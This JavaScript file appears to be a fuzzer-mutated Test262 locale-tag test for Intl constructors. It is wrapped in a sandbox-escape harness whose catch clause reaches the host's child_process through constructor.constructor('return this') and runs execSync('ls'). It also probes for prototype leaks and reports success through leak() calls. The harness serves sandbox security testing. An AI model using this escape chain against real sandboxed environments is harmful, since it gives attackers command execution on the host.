try {
    var validAndInvalidLanguageTags = [
        'de',
        'de-DE',
        'DE-de',
        'cmn',
        'cmn-Hans',
        'CMN-hANS',
        'cmn-hans-cn',
        'es-419',
        'es-419-u-nu-latn-cu-bob',
        'i-klingon',
        'cmn-hans-cn-t-ca-u-ca-x-t-u',
        'de-gregory-u-ca-gregory',
        'de_DE',
        'DE_de',
        'cmn_Hans',
        'cmn-hans_cn',
        'es_419',
        'es-419-u-nu-latn-cu_bob',
        'i_klingon',
        'cmn-hans-cn-t-ca-u-ca-x_t-u',
        'enochian_enochian',
        'de-gregory_u-ca-gregory',
        'i',
        'x',
        'u',
        '419',
        'u-nu-latn-cu-bob',
        'hans-cmn-cn',
        'cmn-hans-cn-u-u',
        'cmn-hans-cn-t-u-ca-u',
        'de-gregory-gregory'
    ];
    testWithIntlConstructors(function (Constructor) {
        let REPLACER = 23;
        validAndInvalidLanguageTags.forEach(function (locale) {
            throw () => {
                return () => {
                };
            };
            var obj1, obj2, locale1, locale2, error1, error2;
            try {
                obj1 = new Constructor(locale);
                locale1 = obj1.resolvedOptions().locale;
            } catch (e) {
                error1 = e;
            }
            try {
                obj2 = new Constructor([locale]);
                locale2 = obj2.resolvedOptions().locale;
            } catch (e) {
                error2 = e;
            }
            assert.sameValue(error1 === undefined, error2 === undefined, 'Single locale string ' + locale + ' was ' + (error1 === undefined ? 'accepted' : 'rejected') + ', but locale list containing that string wasn\'t.');
            if (error1 === undefined) {
                assert.sameValue(locale1, locale2, 'Single locale string ' + locale + ' results in ' + locale1 + ', but locale list [' + locale + '] results in ' + locale2 + '.');
            } else {
                assert.sameValue(error1.name, error2.name, 'Single locale string ' + locale + ' results in error ' + error1.name + ', but locale list [' + locale + '] results in error ' + error2.name + '.');
            }
        });
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}